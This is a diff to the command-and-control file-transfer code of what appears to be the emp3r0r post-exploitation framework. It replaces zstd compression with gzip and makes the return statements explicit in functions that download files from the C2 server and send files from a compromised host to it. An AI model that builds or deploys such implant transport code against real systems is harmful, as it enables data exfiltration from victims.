@@ -2,6 +2,7 @@ package c2transport
 
 import (
 	"bytes"
+	"compress/gzip"
 	"context"
 	"fmt"
 	"io"
@@ -21,7 +22,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archives"
 )
 
 // FetchFile download via grab, if path is empty, return []byte instead
@@ -34,7 +34,7 @@ func FetchFile(config *def.Config, download_addr, file_to_download, path, checks
 		if err == nil {
 			if crypto.SHA256SumRaw(data) == checksum {
 				logging.Infof("FetchFile: %s already exists and checksum matches", path)
-				return
+				return data, err
 			}
 		}
 	}
@@ -72,7 +72,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	lock := fmt.Sprintf("%s.lock", path)
 	if util.IsFileExist(lock) {
 		err = fmt.Errorf("%s already being downloaded", downloadURL)
-		return
+		return data, err
 	}
 
 	// create file.lock to prevent racing downloads
@@ -85,7 +85,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
 	if err != nil {
 		err = fmt.Errorf("DownloadViaC2 EstablishC2Connection: %v", err)
-		return
+		return data, err
 	}
 	defer cancel()
 	defer conn.Close()
@@ -111,7 +111,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
 	if err != nil {
 		err = fmt.Errorf("DownloadViaC2 create file: %v", err)
-		return
+		return data, err
 	}
 	defer f.Close()
 
@@ -120,7 +120,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	_, err = io.CopyBuffer(f, secureConn, copyBuf)
 	if err != nil {
 		err = fmt.Errorf("DownloadViaC2 io.Copy: %v", err)
-		return
+		return data, err
 	}
 
 	// checksum
@@ -143,12 +143,12 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	data, err := util.ReadFileAgent(filepath)
 	if err != nil {
 		err = fmt.Errorf("failed to open %s: %v", filepath, err)
-		return
+		return err
 	}
 
 	if offset > int64(len(data)) {
 		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
-		return
+		return err
 	}
 	data = data[offset:]
 
@@ -156,7 +156,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
 	if err != nil {
 		err = fmt.Errorf("connection failed: %v", err)
-		return
+		return err
 	}
 
 	// Create a debug wrapper
@@ -164,10 +164,10 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	defer secureConn.Close()
 
 	// open compressor
-	compressor, err := archives.Zstd{}.OpenWriter(secureConn)
+	compressor := gzip.NewWriter(secureConn)
 	if err != nil {
 		err = fmt.Errorf("failed to open compressor: %v", err)
-		return
+		return err
 	}
 	defer compressor.Close()
 
@@ -177,7 +177,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	if err != nil {
 		logging.Infof("failed, %d bytes transfered: %v", n, err)
 	}
-	return
+	return err
 }
 
 // AgentFileTransferSessions stores active file transfer sessions between agents
